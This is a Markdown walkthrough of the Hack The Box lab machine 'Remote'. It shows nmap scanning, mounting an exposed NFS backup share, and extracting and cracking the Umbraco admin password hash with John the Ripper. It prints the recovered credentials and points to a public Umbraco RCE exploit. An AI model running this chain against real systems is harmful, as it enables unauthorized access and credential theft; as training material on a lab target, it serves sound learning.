# Hacking `remote` Guideline

[Medium Page](https://medium.com/@CyberOPS.LittleDog/hackthebox-remote-82ae27c71de5)

## Tbot Guideline

### Phase 1: Reconnaissance and Planning

```
We can get the information from the lab Hackthebox, try to gather information as much as we can
 - OS
 - Hostname
 - IP
 - ...
Access the page from IP in browser, check is there any thing interested ^^ 
```

### Phase 2: Scanning

- Since we know the IP of that server, we can take scan it with [nmap](https://nmap.org/)

```sh
$ nmap -sC -sV -A 10.10.10.180
Nmap scan report for 10.10.10.180
Host is up (0.38s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  mountd        1-3 (RPC #100005)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 58s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-07-02T18:19:30
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 441.08 seconds
```

- The result above show us that this server `remote` has open port `21/tcp ftp-anon` and `80/tcp http` also the information `2049/tcp nfs` look interested.
- Lets check is there any share folder with [Showmount](https://docs.oracle.com/cd/E19683-01/817-1717/rfsrefer-34/index.html)

```
$ sudo showmount -e 10.10.10.180
Export list for 10.10.10.180:
/site_backups (everyone)
```

- Huh... let mount it down to our local storage

```
$ sudo mkdir site_backups
$ sudo mount 10.10.10.180:/site_backups site_backups/
```

- From the website of it we can know this site was made from the [CMS Umbraco](https://umbraco.com/) so we can check where is the password of admin for that right?

```
$ cd App_Data/
$ strings Umbraco.sdf | grep admin

Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/password/changepassword change
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/logoutlogout success
User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate
User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/loginlogin success
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/logoutlogout success
...
```

- Copy the hash of Admin and put it file call `hash`, then using tool [John the Ripper](https://en.wikipedia.org/wiki/John_the_Ripper) with password list you can get from anywhere on the internet.

```
$ sudo john hash --format=Raw-SHA1 --wordlist=<your_folder_path>/rockyou.txt
...
?:baconandcheese
```

- Now you got these for the web-site admin page:
  * username: admin@htb.local
  * password: baconandcheese
- As we know the site was made by the [CMS Umbraco](https://umbraco.com/) so we can check its vulnerabilities on the internet and yeah... we can find out this beautiful script in [this repository](https://github.com/noraj/Umbraco-RCE/blob/master/exploit.py), just get it to your machine and ready for the attack.~~~~
